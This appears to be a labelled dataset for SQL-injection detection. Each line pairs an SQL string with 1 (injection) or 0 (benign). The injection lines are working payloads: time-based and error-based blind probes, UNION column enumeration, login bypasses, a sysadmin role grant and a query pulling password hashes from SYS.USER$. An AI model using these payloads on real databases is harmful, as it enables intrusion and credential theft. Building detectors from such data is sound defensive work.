1'   )    )    as fqia where 1936  =  1936 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --;1
SELECT * FROM snow WHERE rising = 'stand'  OR better = 'bear';0
UPDATE road SET separate =  'particular', City =  'freedom' WHERE chapter =  favorite;0
SELECT COUNT ( spite )  FROM kids;0
"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""dyoe""  =  ""dyoe";1
"-1868""  )   where 9495  =  9495 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #";1
select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1;1
1'   )    )    waitfor delay '0:0:5'--;1
select   (  case when   (  5768  =  9169  )   then 5768 else 1/  (  select 0  )   end  )  --;1
1' union all select null,null#;1
SELECT * FROM outer WHERE great BETWEEN doing09/01/1996kind AND image15/31/1996oxygen;0
1' in boolean mode  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --;1
"DELETE FROM customers WHERE price = 'user123';";0
1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'cdaq' like 'cdaq;1
"1""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""igop""  =  ""igop";1
1  )   as attr where 8085  =  8085 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
"UPDATE customers SET status = 'pending' WHERE description = 'Sample text';";0
"1%""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """;1
-2100' where 9260  =  9260 or 3038  =  3038;1
-7505'   )    )    as lqvw where 8565  =  8565 or 6872  =  6872--;1
"INSERT INTO sessions (user_id, status) VALUES ('user123', 'john@example.com');";0
-1985   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  1248  =  1248;1
1'+  (  select rdpe where 6553  =  6553 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +';1
SELECT MIN ( sunlight )  AS region FROM four;0
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   7240  =  7240;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22;1
SELECT * FROM dress WHERE foreign NOT BETWEEN 'deer' AND 'away';0
SELECT * FROM appearance WHERE every = 'exercise';0
SELECT unit FROM meet UNION SELECT notice FROM including ORDER BY specific;0
SELECT DISTINCT baby FROM tin;0
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1";1
1  )   as tgqd where 6369  =  6369 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --;1
admin') or ('1'='1'#;1
"1%""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """;1
FROM  ( SELECT DISTINCT basket FROM usual ) ;0
SELECT solveID AS ID, herself AS near FROM owner;0
1'  )   where 5871  =  5871;1
"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu";1
SELECT * FROM sad 3;0
1   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8814  =  8814;1
SELECT * FROM rock ORDER BY port, friend;0
UNION ALL SELECT @@VERSION,USER(),SLEEP(5)--;1
SELECT * FROM read WHERE slightly = 'remember' FETCH FIRST 3 ROWS ONLY;0
1%' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  ';1
SELECT Orders.shadowrID, Employees.becoming, Employees.please FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.seeID ORDER BY Orders.nestID;0
select * from users where id  =  1 +. union select null,@@VERSION -- 1;1
"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm";1
"INSERT INTO employees (created_at, id, user_id, quantity) VALUES ('john@example.com', 'user123', '2023-01-01', 123);";0
SELECT television ( s )  FROM bill SELECT transportation ( s ) ;0
" select * from users where id  =  1 or "".#"" or 1  =  1 -- 1";1
SELECT * FROM lift WHERE everyone BETWEEN 'joy' AND 'construction';0
select * from users where id  =  1 union select .1$_,version  (    )   -- 1;1
SELECT column_name ( s )  FROM zipper,hot;0
UNION ALL SELECT 1,2,3,4--;1
1'   )    )    as icik where 1440  =  1440 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
1  )   where 8630  =  8630 union all select null,null--;1
-1648   )    )    as oqqy where 3459  =  3459 or 6872  =  6872--;1
SELECT * FROM passage WHERE trouble LIKE '%pen%';0
select sleep  (  5  )  -- waln;1
SELECT * FROM nest WHERE    NOT burst = 'source';0
UNION ALL SELECT NULL--;1
1   )    )    as ehlg where 6340  =  6340;1
"-1390%""   )    )    union all select 8930,8930,8930,8930,8930#";1
SELECT * FROM ran WHERE element NOT LIKE '[spell]%';0
-2394'  )   union all select 1650,1650,1650,1650,1650,1650,1650--;1
" end and   (  ""%""  =  """;1
SELECT * FROM cat WHERE member IN  ( 'sum', 'harbor', 'edge' )  ;0
SELECT TOP 50 PERCENT * FROM take SELECT * FROM result FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM law;0
SELECT TOP 50 PERCENT * FROM tried;0
select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv;1
UPDATE bark SET few =  'vapor', City =  'subject' WHERE alphabet =  pretty;0
""")) or benchmark(10000000,MD5(1))#";1
1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782;1
"admin""  )   or ""1""  =  ""1";1
1'+  (  select rqcw where 9002  =  9002 union all select null,null,null,null,null,null,null,null,null#;1
SELECT frontID AS ID, command AS rapidly FROM everything;0
-5518  )   as yvqm where 7360  =  7360 union all select 7360,7360#;1
"1""   )    )    as dksq where 7161  =  7161";1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#;1
select * from users where id  =  '1' union select @ 1,version  (    )   --  1';1
SELECT * FROM taught WHERE    NOT chose = 'make';0
(  select 2412  =    (  'qqpjq'||  (  select case 2412 when 2412 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    ) ;1
1'||  (  select 'cclo' from dual where 6823  =  6823 and 9198  =  9198--;1
"1""  )   as zovk where 4591  =  4591 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --";1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--;1
hi' or 1  =  1 --;1
@variable;1
"UPDATE orders SET description = 'john@example.com' WHERE name = '2023-01-01';";0
SELECT do,fort FROM know WHERE sitting = 'fallen' UNION SELECT during, plane FROM pencil;0
select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  5432  =  5432;1
"1""   )    )    as vdbf where 7969  =  7969 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --";1
exec sp_addsrvrolemember 'name' , 'sysadmin';1
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'obwn'  =  'obwn;1
1'  )   as qaec where 6572  =  6572 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --;1
" select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1";1
"SELECT user_id, quantity FROM inventory WHERE id = 'john@example.com';";0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--;1
-6222   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   3230  =  3230;1
1   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
"-5572""  )   union all select 8131,8131#";1
"SELECT name, status, email, price FROM products WHERE user_id = 'john@example.com';";0
"SELECT name, id, user_id, created_at FROM sessions WHERE description = 'john@example.com';";0
-9336' or 5641  =  9488#;1
SELECT * FROM orbit  WHERE house = dozen;0
"UPDATE orders SET email = 'Sample text' WHERE id = 'pending';";0
ORDER BY 2;1
1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #;1
"1"" where 4345  =  4345 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --";1
"INSERT INTO products (email, status) VALUES ('active', 'Sample text');";0
1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--;1
select count  (  *  )   from generate_series  (  1,5000000  )   and 'roca'  =  'roca;1
SELECT TOP 3 * FROM curious SELECT * FROM halfway 3SELECT * FROM telephone;0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#;1
-4222'  )   union all select 9267,9267,9267,9267,9267,9267--;1
SELECT AVG ( coffee ) FROM club;0
1 union all select null,null,null,null,null,null,null#;1
SELECT * FROM seen WHERE listen BETWEEN '1996-07-01' AND '1996-07-31';0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#;1
1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ;1
if  (  8264  =  1939  )   select 8264 else drop function nsoq--;1
1'  )   where 9159  =  9159;1
1  )   union all select null,null,null,null,null,null,null,null,null--;1
select * from users where id  =  '1' union select #,@@VERSION -- 1';1
SELECT * FROM bare WHERE tomorrow BETWEEN bent09/01/1996improve AND clock15/31/1996musical;0
select * from users where id  =  1 or   (  .  )    =  1 union select 1,@@VERSION -- 1;1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9;1
1'   )    )    and elt  (  6847  =  5874,5874  )   and    (    (   'yspu'  =  'yspu;1
select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20;1
UNION ALL SELECT 1,2,3,4,5;1
"INSERT INTO customers (status, user_id, email, created_at) VALUES ('john@example.com', 'Sample text', 'active', 123);";0
SELECT MIN ( held )  AS gentle FROM fifty;0
"UPDATE inventory SET id = 'john@example.com' WHERE status = 'user123';";0
"DELETE FROM products WHERE email = '2023-01-01';";0
"-3884"" where 8012  =  8012 union all select 8012,8012#";1
"1""   )    )    as riui where 2605  =  2605";1
"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --";1
-2429%' or 6890  =  5846;1
SELECT * FROM social WHERE headed NOT BETWEEN 'failed' AND 'clothing';0
"SELECT id, name, price FROM sessions WHERE name = 123;";0
"1""  )   as mibc where 3113  =  3113";1
1 where 1299  =  1299;1
"UPDATE sessions SET id = 'Sample text' WHERE user_id = 'Sample text';";0
-6129 union all select 9122,9122#;1
SELECT AVG ( somehow ) FROM make SELECT SUM ( shade ) ;0
-6492'  )   union all select 7204,7204--;1
SELECT AVG ( sick ) FROM forgot SELECT SUM ( band ) ;0
SELECT * FROM chest WHERE room = 'completely' FETCH FIRST 3 ROWS ONLY;0
PRINT;1
waitfor delay '00:00:05'--;1
-9556 or   (  2049  =  6967  )  *6967# mhbc;1
1'||  (  select 'bnaz' from dual where 7168  =  7168 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#;1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""pawh""  =  ""pawh";1
"INSERT INTO products (user_id, name, status, email) VALUES ('active', 456, 'Sample text', '2023-01-01');";0
select * from users where id  =  '1' union select $*$,@@VERSION -- 1';1
INSERT INTO nearer  ( stairs, officer, dear )  VALUES  ( 'band', 'throw', 'tales' )  ;0
SELECT * FROM her WHERE yes BETWEEN deep09/01/1996slept AND division15/31/1996aware;0
"1""  )   where 1673  =  1673 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --";1
1'||  (  select 'hfbt' where 7204  =  7204 union all select null,null,null,null,null,null,null,null,null,null--;1
1'   )    )     )   union all select null,null,null,null--;1
SELECT wrong FROM than UNION ALL SELECT steam FROM send ORDER BY porch;0
"UPDATE sessions SET price = 'john@example.com' WHERE created_at = 'pending';";0
"DELETE FROM inventory WHERE quantity = 'pending';";0
SELECT thy ( s )  FROM engine UNION;0
1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg;1
1  )   as wust where 3884  =  3884 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
"""*""";1
select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1;1
1'+  (  select 'ycsv' where 3628  =  3628 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --;1
call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #;1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i;1
-7979'+  (  select 'bkvt' where 3613  =  3613 union all select 3613#;1
FROM  ( SELECT DISTINCT memory FROM track ) ;0
-2050' union all select 5606#;1
1'   )    )    as usrk where 6324  =  6324 union all select null,null,null,null,null,null,null,null,null,null--;1
1%'   )    )     )   and 1661  =  7683;1
or 1  =  1 --;1
1  ) ;1
1'||  (  select 'ejuu' from dual where 2903  =  2903 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||';1
"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#";1
admin') or '1'='1;1
"INSERT INTO employees (name, price, status) VALUES ('Sample text', 456, 123);";0
-6548 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- rlda;1
"DELETE FROM products WHERE quantity = '2023-01-01';";0
SELECT * FROM largest WHERE union NOT LIKE '[function]%';0
admin' or '1'='1'/*;1
"1""  )   where 9827  =  9827";1
select   (  case when   (  1946  =  1302  )   then 1946 else 1/  (  select 0  )   end  )  --;1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--;1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i;1
SELECT goose FROM than UNION ALL SELECT cent FROM dull ORDER BY skin;0
x' or 1  =  1 or 'x'  =  'y;1
"INSERT INTO sessions (email, quantity, description) VALUES ('pending', 123, 'Sample text');";0
"INSERT INTO employees (user_id, status, description) VALUES ('pending', 'Sample text', 456);";0
"23 or 1  =  1; --";1
SELECT * FROM friendly WHERE pictured = 'name'  AND City = 'growth';0
"SELECT description, user_id FROM sessions WHERE price = 'john@example.com';";0
"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --";1
DELETE FROM somehow WHERE factor = 'fruit';0
select * from users where id  =  '1' or .<$ union select 1,@@VERSION -- 1';1
SELECT MIN ( own )  AS window FROM had;0
" select * from users where id  =  1 or "";#"" or 1  =  1 -- 1";1
"1%""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --";1
"SELECT * FROM put WHERE copper BETWEEN ""according"" AND    ""cream""";0
or uname like '%;1
-3349   )    )     )   union all select 6553,6553#;1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23;1
UNION SELECT;1
SELECT * FROM cake  WHERE major = party;0
1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'nuis'  =  'nuis;1
